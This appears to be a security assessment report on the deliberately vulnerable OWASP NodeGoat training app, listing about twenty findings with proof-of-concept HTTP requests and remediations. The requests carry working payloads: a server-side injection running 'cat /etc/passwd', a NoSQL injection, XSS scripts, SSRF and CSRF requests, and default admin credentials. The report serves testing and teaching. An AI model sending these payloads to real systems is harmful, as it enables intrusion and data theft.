Vulnerability.Name: Code Injection in /contributions
Vulnerability.Description: Server-side JavaScript code injection vulnerability exists due to insufficient filtration of user-supplied data passed via the "preTax" HTTP POST parameter to "http://owasp-nodegoat.com:4000/contributions" URL. A remote authenticated attacker (note, registration is open) can send a specially crafted HTTP POST request and execute arbitrary JavaScript code in the security context of the Node.js server.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/contributions HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Referer: http://owasp-nodegoat.com:4000/contributions Content-Type: application/x-www-form-urlencoded Content-Length: 90 Connection: close Cookie: connect.sid=s%3ATVNY7sIvAefK3mQqKY55ouSIymVtOlNr.ab4Ev%2FCyiDZODrQZOQL1Ejq4AVo4Eii51cYfCCr1L1g Upgrade-Insecure-Requests: 1
preTax=preTax%3D2%3B+var+asd+%3D+require%28%27child_process%27%29.execSync%28%27cat+%2Fetc%2Fpasswd%27%29%3B+res.write%28asd%29&roth=0&afterTax=0
Vulnerability.Remediation: Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.

Vulnerability.Name: Default Administrative Credentials
Vulnerability.Description:
It is possible to login to the web application at "[b]http://owasp-nodegoat.com:4000/login[/b]" with default administrator credentials:
admin:Admin_123
This allows an attacker to access the administrator panel and list all employees, and modify benefit details This can lead to the disruption of business processes.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/login HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://owasp-nodegoat.com:4000/login Content-Type: application/x-www-form-urlencoded Content-Length: 40 Connection: close Cookie: connect.sid=s%3AiPWDHvwFFxAuLWhX-NzSevJGgkTeNDXY.q0%2BrgCqu7knSrKeXWvYWYjUTM%2Bl5AyOB12VBCqkxy8w Upgrade-Insecure-Requests: 1
userName=admin&password=Admin_123&_csrf=
Vulnerability.Remediation: Implement a sufficiently string password policy for all user accounts. One which enforces complexity rules such as length, and a mix of letters/numbers and special characters.

Vulnerability.Name: Improper Access Control to /benefits
Vulnerability.Description:
The web application does not properly limits access to the "[B]/benefits[/B]" URL, which contains administrative functionality and potentially sensitive information. A remote authenticated attacker (registration is open) can use the vulnerable URL to access administrative functionality and gain potentially sensitive data.
Upon successful exploitation of this vulnerability, an attacker will be able to collect potentially sensitive information or perform further attacks, e.g. elevate privileges in the application using Stored XSS vulnerability (#52577646).
Vulnerability.PoC: GET http://owasp-nodegoat.com:4000/benefits HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: connect.sid=s%3AxXmL6zNLGdvwBD8obMRUPrEg73VNAHXY.QAf7RYmaebIsA1UuU9LgWhyDKdMNZePvrEWfZcP5odE Upgrade-Insecure-Requests: 1
Vulnerability.Remediation: Implement a proper User Access Control mechanism in your web application in order to verify the user's identity and access permissions before allowing access to any sensitive data.

Vulnerability.Name: CSRF in /profile
Vulnerability.Description: A Cross-Site Request Forgery (CSRF) vulnerability exists due to insufficient validation of the HTTP request origin at "[B]/profile[/B]" URL. A remote unauthenticated attacker can create a specially crafted malicious web page with the CSRF exploit, trick a logged-in authorized to visit the page, spoof the HTTP request as if it was coming from the legitimate user, and change user first name, last name and address.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/profile HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Referer: http://owasp-nodegoat.com:4000/profile Content-Type: application/x-www-form-urlencoded Content-Length: 87 Connection: close Cookie: connect.sid=s%3AxXmL6zNLGdvwBD8obMRUPrEg73VNAHXY.QAf7RYmaebIsA1UuU9LgWhyDKdMNZePvrEWfZcP5odE Upgrade-Insecure-Requests: 1
firstName=&lastName=&ssn=&dob=&bankAcc=&bankRouting=0198212%23+&address=&_csrf=&submit=
Vulnerability.Remediation: Implement a proper anti-CSRF protection mechanism, which would generate unique random tokens for every form, keep track of these tokens and perform validation of the HTTP request origin by comparing received token from the user with the token generated on the server side.

Vulnerability.Name: Weak Password Policy
Vulnerability.Description: The web application's current password policy allows weak passwords that could be trivially guessed by attackers, an example is a testing account created during the assessment of "password". We recommend changing your password policy and reject weak and predictable passwords. Passwords are considered strong, when they are at least 8-10 characters long, contain lower and upper case letters, numbers and special symbols.

Vulnerability.Name: Missing Brute-force Protection
Vulnerability.Description: Your application does not seem to have protection against brute-force attacks and allows unlimited number of attempts to guess username and password. A remote attacker can abuse the lack of such security measure and gain unauthorized access to your web application.
Vulnerability.Remediation: It is recommended to add additional level of protection against brute-force attacks and require CAPTCHA code after a certain number of unsuccessful login attempts (recommended values are from 3 to 5 unsuccessful attempts) or lock the account for a certain amount of time (recommended value is 30 minutes).

Vulnerability.Name: Improper Access Control at http://owasp-nodegoat.com:4000/allocations/
Vulnerability.Description: The web application allows uses a numeric identifier to reference objects related to asset information at the "[B]http://owasp-nodegoat.com:4000/allocations/#ID#[/B]" URL, where #ID# stands for a subsequent number. A remote authenticated user (registration is open) can modify the identifier in URL and get unauthorized access to sensitive data of other web application users.
Vulnerability.Remediation: Implement a proper User Access Control mechanism in your web application in order to verify the user's identity and access permissions before allowing access to any sensitive data.

Vulnerability.Name: Usernames Enumeration
Vulnerability.Description: A user account enumeration issue exists due a verbose error message when attempting to login via "[b]/login[/b]" URL. Upon entering a non-existing value, the application will respond with an error message saying "Invalid username", while upon supplying an existing user account, the application will respond with "Invalid password" message. A remote unauthenticated attacker can use brute-force attack to enumerate existing user accounts, as there is no captcha present on the password reset page.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/login HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Referer: http://owasp-nodegoat.com:4000/login Content-Type: application/x-www-form-urlencoded Content-Length: 35 Connection: close Cookie: connect.sid=s%3A-kBD9z7vKV0FP_FBedM2ib4Kno4SjbE_.NbBoiFTdgA3uiUoMIfdaoP%2FKh5Y9P3RJdK4cTI%2Ftu4s Upgrade-Insecure-Requests: 1
userName=nosuchusername&password=123&_csrf=
Vulnerability.Remediation: Ensure that the same message is returned by the application with both existing and non-existing user accounts. In addition, implement a captcha mechanism on the password reset page to limit the number of reset attempts that can come from a given IP address.

Vulnerability.Name: Open Redirect in /learn
Vulnerability.Description: An Open Redirection vulnerability exists due to insufficient validation of the "[B]url[/B]" HTTP GET parameter in "[B]/learn[/B]" script prior to redirection.
Vulnerability.Remediation: To eliminate the vulnerability we propose editing the source code of your web application and change the behavior of your redirection script. Do not to rely on the "url" HTTP GET parameter when redirecting users to internal or external web pages. We suggest implementing additional checks for the redirection URL or use so-called proxy pages when redirecting users to external websites in order to warn them that they are leaving your website.

Vulnerability.Name: Usage of Unencrypted HTTP Protocol
Vulnerability.Description: The web application uses the unencrypted HTTP protocol to transmit sensitive information, such as user credentials via the login form. An attacker with ability to perform a man-in-the-middle attack can intercept credentials and compromise user accounts.
Vulnerability.Remediation: Enforce the use of HTTPS site-wide along with a valid certificate signed by a trusted certificate authority.

Vulnerability.Name: NoSQL Injection in /allocations
Vulnerability.Type: Improper Neutralization of Special Elements in Data Query Logic
Vulnerability.Description: A NoSQL injection vulnerability exists in the "[B]/allocations/67[/B]" URL when handling user-supplied input passed without sanitization via the "[B]threshold[/B]" HTTP GET parameter.
Vulnerability.PoC: GET http://owasp-nodegoat.com:4000/allocations/67?threshold=5%27;return%20(true);var%20foo=%27bar HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: connect.sid=s%3Ay1QXigxD4S83biS13G4NcUBE_Mw95xu2.2%2BX3%2F0Tr046AmODS2aLuJdv8jLSCVtVrTSPAO3pMkBs Upgrade-Insecure-Requests: 1
Vulnerability.Remediation: Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.

Vulnerability.Name: Server-Side Request Forgery (SSRF) in http://owasp-nodegoat.com:4000/research
Vulnerability.Description: A Server-Side-Request Forgery vulnerability exists due to the application accepts arbitrary URL passed via the "url" HTTP GET parameter to "http://owasp-nodegoat.com:4000/research" and uses it to perform queries. A remote authenticated attacker (registration is open) can abuse this functionality to send requests to arbitrary servers, including servers, located in local network.
Vulnerability.PoC: GET http://owasp-nodegoat.com:4000/research?url=https%3A%2F%2Fwww.immuniweb.com%2F&symbol=a HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: connect.sid=s%3A3ftM3fmLFECSytgej2TaL_r8byx_H8wh.ooNhgVIrmo6wASJkqZDCf7YD%2F7Ed1KzUtRw9OhZVys8 Upgrade-Insecure-Requests: 1
Vulnerability.Remediation: Whitelist the URLs that the application is allowed to connect to and disable any other requests.

Vulnerability.Name: Insecure Session Management
Vulnerability.Description: The web application does not issue a new session identifier after the user has logged back in from an old session. This allows an attacker to hijack the session of a victim if they are able to steal their cookie. This can lead to account compromise.
Vulnerability.Remediation: Ensure that a new session identifier is issued to every new session, with the previous sessions identifier being invalidated.

Vulnerability.Name: Reflected XSS in /signup
Vulnerability.Description: Reflected Cross-Site Scripting vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]http://owasp-nodegoat.com:4000/signup[/B]" URL passed via the "[B]email[/B]" and "[b]username[/b]" HTTP POST parameters.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/signup HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 Accept: */* Accept-Encoding: deflate, gzip Referer: http://owasp-nodegoat.com:4000/signup Cookie: connect.sid=s%3AJNOTfSmHp-UAIbkg_md4DN4wB39FY0xW.Z9EbGMSy6Q3jx2FIwkNXx4gohw83U%2BR%2BlhanzlhydAQ Accept-Language: en-us;q=0.8 Content-Length: 131 Content-Type: application/x-www-form-urlencoded
_csrf=&email=[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]&firstName=1&lastName=1&password=&userName=[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]&verify=
Vulnerability.Remediation: Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.

Vulnerability.Name: Reflected XSS in /tutorial/
Vulnerability.Description: Reflected Cross-Site Scripting vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]http://owasp-nodegoat.com:4000/tutorial/[PAYLOAD]%3CiMg%20src%3Dx%20onerror%3Dalert%28%27ImmuniWeb%27%29%3E%20%20[/PAYLOAD][/B]" URL passed via the HTTP GET.
Vulnerability.PoC: GET http://owasp-nodegoat.com:4000/tutorial/[PAYLOAD]%3CiMg%20src%3Dx%20onerror%3Dalert%28%27ImmuniWeb%27%29%3E%20%20[/PAYLOAD] HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: */* Accept-Encoding: deflate, gzip Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn2ifT4u19iw8z4Y%2Fs3jA8 Accept-Language: en-us;q=0.8
Vulnerability.Remediation: Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.

Vulnerability.Name: Stored XSS in /benefits
Vulnerability.Description: Stored Cross-Site Scripting vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]/benefits[/B]" URL passed via the "[B]benefitStartDate[/B]" POST parameter. A remote authenticated attacker (registration is open) can inject arbitrary HTML and script code and execute it against web application administrator.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/benefits HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Referer: http://owasp-nodegoat.com:4000/benefits Content-Type: application/x-www-form-urlencoded Content-Length: 34 Connection: close Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn2ifT4u19iw8z4Y%2Fs3jA8 Upgrade-Insecure-Requests: 1
userId=3&benefitStartDate=[PAYLOAD]"><script>alert("ImmuniWeb");</script>[/PAYLOAD]
Vulnerability.Remediation: Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.

Vulnerability.Name: Web Forms Collecting Attributable Personal Data
Vulnerability.Description: The following web forms may collect attributable personal data. Make sure that your data acquisition, processing, storage and deletion are compliant with EU GDPR and other applicable privacy laws and regulations. A list of URLs with the web forms are shown below: http://owasp-nodegoat.com:4000/signup

Vulnerability.Name: Reflected XSS in /allocations/1
Vulnerability.Description: A XSS vulnerability exists due to the insufficient filtration and further processing of user-supplied data appended after the "[B]/allocations/1[/B]" URL.
Vulnerability.PoC: GET http://owasp-nodegoat.com:4000/allocations/1[PAYLOAD]%22%3E%3Cimg%20src=x%20onerror=alert%60ImmuniWeb%60%3E[/PAYLOAD] HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn2ifT4u19iw8z4Y%2Fs3jA8 Upgrade-Insecure-Requests: 1
Vulnerability.Remediation: Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.

Vulnerability.Name: Reflected XSS in /login
Vulnerability.Description: Reflected Cross-Site Scripting (XSS) vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]/login[/B]" URL passed via the "[B]userName[/B]" HTTP POST parameter.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/login HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 Accept: */* Accept-Encoding: deflate, gzip Cookie: connect.sid=s%3Aot8tqG6LX3jOHlfb1Fh_Y9KB_HE6vzHs.1bUUNROIgDkK1gAZTfzFtJ7an6HVmjOftxHJwqM%2Fx8Q Accept-Language: en-us;q=0.8 Content-Length: 103 Content-Type: application/x-www-form-urlencoded
_csrf=&password=admin1&userName=admin[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]
Vulnerability.Remediation: Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.

Vulnerability.Name: Reflected XSS in /profile
Vulnerability.Description: Reflected XSS vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]/profile[/B]" URL passed via the "[B]lastName[/b]" and "[b]ssn[/B]" HTTP POST parameters.
Vulnerability.PoC:
POST http://owasp-nodegoat.com:4000/profile HTTP/1.1 Host: owasp-nodegoat.com:4000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en,en-US;q=0.5 Accept-Encoding: gzip, deflate Referer: http://owasp-nodegoat.com:4000/profile Content-Type: application/x-www-form-urlencoded Content-Length: 198 Connection: close Cookie: connect.sid=s%3ADgQ1ifBCLLm5ZR1lQOG6ToRsMQYQX2Hj.6JxsRXgGs0b93zquY%2FWzdDTlxIRt%2Fgs1AEZXKU%2FsT2A Upgrade-Insecure-Requests: 1
firstName=&lastName=[PAYLOAD]%22%3E%3Cscript%3Ealert%60ImmuniWeb%60%3B%3C%2Fscript%3E[/PAYLOAD]&ssn=[PAYLOAD]%22%3E%3Cscript%3Ealert%60ImmuniWeb%60%3B%3C%2Fscript%3E[/PAYLOAD]&dob=&bankAcc=&bankRouting=0198212%23&address=&_csrf=&submit=
Vulnerability.Remediation: Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
